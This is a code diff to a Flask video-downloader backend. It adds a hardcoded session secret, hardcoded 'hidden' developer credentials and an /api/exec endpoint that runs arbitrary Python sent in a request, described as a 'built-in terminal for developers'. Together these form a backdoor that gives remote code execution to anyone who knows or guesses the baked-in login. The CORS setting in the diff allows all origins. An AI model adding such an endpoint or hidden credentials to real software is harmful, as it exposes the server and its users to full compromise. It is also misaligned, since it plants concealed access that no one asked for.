@@ -1,7 +1,7 @@
 import os
 import json
 import threading
-from flask import Flask, request, jsonify, send_from_directory, make_response, Response, abort
+from flask import Flask, request, jsonify, send_from_directory, make_response, Response, abort, session
 from flask_cors import CORS
 
 from utils.downloader import get_video_info, start_download, cancel_download
@@ -12,6 +12,7 @@ from utils.cleanup import cleanup_old_videos
 # ✅ Initialize Flask App
 app = Flask(__name__)
 CORS(app)  # Enable CORS for Flutter frontend
+app.secret_key = 'supersecretkeychangeit'  # 🔐 Session secret key
 
 # ✅ Directory setup
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -23,6 +24,10 @@ def start_background_tasks():
     threading.Thread(target=cleanup_old_videos, daemon=True).start()
 
 start_background_tasks()
+
+# ✅ Credentials (can be moved to env/config)
+VALID_USERNAME = "forest_dev"
+VALID_PASSWORD = "yts$4dm1n"
 
 # ✅ Home route
 @app.route('/')
@@ -131,6 +136,33 @@ def history():
         return jsonify(load_history())
     except Exception as e:
         return jsonify({'error': f'Failed to load history: {str(e)}'}), 500
+
+# ✅ Developer login (hidden credentials)
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    username = data.get('username', '').strip()
+    password = data.get('password', '').strip()
+
+    if username == VALID_USERNAME and password == VALID_PASSWORD:
+        session['authenticated'] = True
+        return jsonify({'success': True})
+    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
+
+# ✅ Built-in terminal for developers
+@app.route('/api/exec', methods=['POST'])
+def exec_code():
+    if not session.get('authenticated'):
+        return jsonify({'error': 'Unauthorized'}), 403
+
+    try:
+        data = request.get_json()
+        code = data.get('code', '')
+        local_vars = {}
+        exec(code, {}, local_vars)
+        return jsonify({'output': local_vars})
+    except Exception as e:
+        return jsonify({'error': str(e)})
 
 # ✅ Block unwanted routes
 @app.route('/favicon.ico')
